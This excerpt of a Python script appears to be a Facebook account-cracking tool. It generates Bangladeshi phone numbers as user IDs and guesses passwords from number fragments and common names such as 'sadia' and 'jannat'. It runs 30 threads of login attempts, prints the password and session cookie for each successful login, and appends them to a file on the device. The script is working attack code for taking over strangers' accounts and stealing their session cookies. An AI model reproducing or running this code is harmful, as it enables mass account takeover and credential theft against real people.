...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mXYN ARIYAN
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mXYN ARIYAN
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m2.6
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print('[+] BD NUMBER  => 014 013 016 017 018 019')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000. 5000. 10000. 15000. 50000. 99999')
    ...
    with ThreadPool(max_workers=30) as akash:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'jannat','sadia','i love u','sumaiya','sadiya','Banglades']
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sXYN•🥵🔥\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; X88pro10.q2.0.6330.d4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6331.212 Mobile Safari/537.36',
            'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[XYN-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/XYN-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#                print(f"\x1b[38;5;190m[XYN-CP😔] {uid}|{ps}")
